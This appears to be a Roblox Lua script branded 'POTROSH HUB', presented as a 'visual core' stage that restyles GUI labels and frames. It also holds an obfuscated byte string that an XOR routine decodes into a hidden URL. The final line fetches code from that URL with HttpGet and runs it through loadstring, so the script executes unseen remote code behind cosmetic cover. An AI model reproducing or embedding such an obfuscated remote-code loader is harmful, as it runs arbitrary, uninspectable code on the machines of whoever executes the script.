
--[[ STAGE 2: VISUAL CORE ]]
local qwWPc3cErlbsW3dLzHAy="\235\253\251\253\198\015\006\004\193\254\214\015\194\206\211\205\220\207\216\216\212\167\210\164\165\173\216\175\183\235\162\180\180\240\177\188\189\182\184\190\132\190\129\136\135\200\133\147\136\140\146\100\136\157\155\164\100\158\100\111\170\136\151\100\138\127\108\127\119\104\103\122\124\124\120\124\106\075\075\074\085\074\078\120\083\094\039\084\125\094\045\046\090\084\054\062\049\044\040\044\053\066\069\062\079\077\075\007\077\013\016\002"local LXkLdctiMM46612=230 local nm9sfz6I2lMYqbznRaha6Q=159 local J64pA_8Oyo6WTfpFhTTcpr=1 local Q9oyeEr1IvRjIbUDjVp=2 local JTK3NJVUXSkgPIUjkhudus=4 local bmARLIMGfZcVFCxc8QQU=false local eKJJpFujl8A9N93=bit32 and bit32.bxor if not eKJJpFujl8A9N93 then eKJJpFujl8A9N93=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Q7r_H89S2jct={}for sRm6Ip20yMjSI9oDFsf=1,#qwWPc3cErlbsW3dLzHAy do local UukP4pLqYOrZI6H=string.byte(qwWPc3cErlbsW3dLzHAy,sRm6Ip20yMjSI9oDFsf)local zlS65Ag5nxXtSWNTfo6SO=(nm9sfz6I2lMYqbznRaha6Q+(sRm6Ip20yMjSI9oDFsf*Q9oyeEr1IvRjIbUDjVp)+JTK3NJVUXSkgPIUjkhudus)%256 if J64pA_8Oyo6WTfpFhTTcpr==0 then UukP4pLqYOrZI6H=(UukP4pLqYOrZI6H-zlS65Ag5nxXtSWNTfo6SO)%256 Q7r_H89S2jct[sRm6Ip20yMjSI9oDFsf]=string.char(eKJJpFujl8A9N93(UukP4pLqYOrZI6H,LXkLdctiMM46612))else UukP4pLqYOrZI6H=eKJJpFujl8A9N93(UukP4pLqYOrZI6H,LXkLdctiMM46612)Q7r_H89S2jct[sRm6Ip20yMjSI9oDFsf]=string.char((UukP4pLqYOrZI6H-zlS65Ag5nxXtSWNTfo6SO)%256)end end local swLxqLSXt4Bq=table.concat(Q7r_H89S2jct)if bmARLIMGfZcVFCxc8QQU then swLxqLSXt4Bq=string.reverse(swLxqLSXt4Bq)end local Ql4CgS2eQg0sKYxMxD=swLxqLSXt4Bq
local HubName = "POTROSH HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(Ql4CgS2eQg0sKYxMxD))()
